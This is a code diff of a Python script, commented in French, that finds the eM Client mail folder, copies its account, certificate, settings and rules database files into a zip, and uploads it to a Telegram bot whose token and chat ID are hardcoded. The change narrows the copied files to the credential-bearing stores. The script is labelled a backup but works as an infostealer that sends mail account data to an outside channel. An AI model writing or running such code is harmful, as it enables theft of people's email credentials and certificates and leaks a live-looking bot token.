@@ -13,8 +13,22 @@ import urllib.request
 # === CONFIGURATION ===
 BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
 CHAT_ID = "513947114"
-NOM_ZIP = "eMClient_FullBackup.zip"
+NOM_ZIP = "eMClient_FichiersUtiles.zip"
 # ======================
+
+# Fichiers ciblés
+FICHIERS_A_RECUPERER = [
+    "accounts.dat", "accounts.dat-shm", "accounts.dat-wal",
+    "categories.dat", "categories.dat-shm", "categories.dat-wal",
+    "certificates.dat", "certificates.dat-shm", "certificates.dat-wal",
+    "main.dat",
+    "quickActions.dat", "quickActions.dat-shm", "quickActions.dat-wal",
+    "rules.dat", "rules.dat-shm", "rules.dat-wal",
+    "settings.dat", "settings.dat-shm", "settings.dat-wal",
+    "snippets.dat", "snippets.dat-shm", "snippets.dat-wal",
+    "templates.dat", "templates.dat-shm", "templates.dat-wal",
+    "widgets.dat", "widgets.dat-shm", "widgets.dat-wal"
+]
 
 def detect_outgoing_connections(process_name="MailClient.exe"):
     log = []
@@ -43,7 +57,6 @@ def afficher_info_reseau():
     try:
         hostname = socket.gethostname()
         print(f"Nom de la machine : {hostname}")
-
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip_locale = s.getsockname()[0]
@@ -65,14 +78,7 @@ def afficher_info_reseau():
     else:
         subprocess.run(["ifconfig"], shell=False)
 
-def lister_contenu_dossier(dossier, fichier_output):
-    with open(fichier_output, "w", encoding="utf-8") as f:
-        for root, _, files in os.walk(dossier):
-            for file in files:
-                rel_path = os.path.relpath(os.path.join(root, file), dossier)
-                f.write(rel_path + "\n")
-
-def exporter_dossier_complet_et_envoyer():
+def exporter_fichiers_specifiques_et_envoyer():
     try:
         emclient_path = chercher_dossier_emclient()
         if not emclient_path:
@@ -80,19 +86,28 @@ def exporter_dossier_complet_et_envoyer():
             return
 
         temp_dir = tempfile.mkdtemp()
-        backup_dir = os.path.join(temp_dir, "eMClientBackup")
-        shutil.copytree(emclient_path, backup_dir)
+        backup_dir = os.path.join(temp_dir, "eMClientFiles")
+        os.makedirs(backup_dir, exist_ok=True)
 
-        # Fichier des connexions sortantes
+        # Copier uniquement les fichiers demandés
+        fichiers_copies = []
+        for fichier in FICHIERS_A_RECUPERER:
+            chemin_source = os.path.join(emclient_path, fichier)
+            if os.path.exists(chemin_source):
+                shutil.copy2(chemin_source, os.path.join(backup_dir, fichier))
+                fichiers_copies.append(fichier)
+
+        # Ajouter fuite_ip.txt
         ip_logs = detect_outgoing_connections()
         with open(os.path.join(backup_dir, "fuite_ip.txt"), "w") as f:
             f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")
 
-        # Fichier index.txt listant tous les fichiers copiés
-        index_path = os.path.join(backup_dir, "index.txt")
-        lister_contenu_dossier(backup_dir, index_path)
+        # Ajouter index.txt
+        with open(os.path.join(backup_dir, "index.txt"), "w", encoding="utf-8") as f:
+            for fichier in fichiers_copies:
+                f.write(fichier + "\n")
 
-        # Création du ZIP
+        # Créer le ZIP
         zip_path = os.path.join(temp_dir, NOM_ZIP)
         with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
             for root, _, files in os.walk(backup_dir):
@@ -101,17 +116,17 @@ def exporter_dossier_complet_et_envoyer():
                     rel_path = os.path.relpath(abs_path, backup_dir)
                     zipf.write(abs_path, rel_path)
 
-        # Envoi sur Telegram
+        # Envoyer sur Telegram
         with open(zip_path, "rb") as f:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={"chat_id": CHAT_ID, "caption": f"📦 Backup eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
+                data={"chat_id": CHAT_ID, "caption": f"📦 eM Client Backup - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                 files={"document": f}
             )
 
-        print("✅ Backup complet envoyé avec index.txt et fuite_ip.txt.")
+        print("✅ Fichiers essentiels eM Client envoyés avec succès.")
     except Exception as e:
-        print("Erreur :", e)
+        print("❌ Erreur :", e)
     finally:
         try:
             shutil.rmtree(temp_dir)
@@ -119,5 +134,5 @@ def exporter_dossier_complet_et_envoyer():
             pass
 
 if __name__ == "__main__":
-    exporter_dossier_complet_et_envoyer()
+    exporter_fichiers_specifiques_et_envoyer()
     afficher_info_reseau()
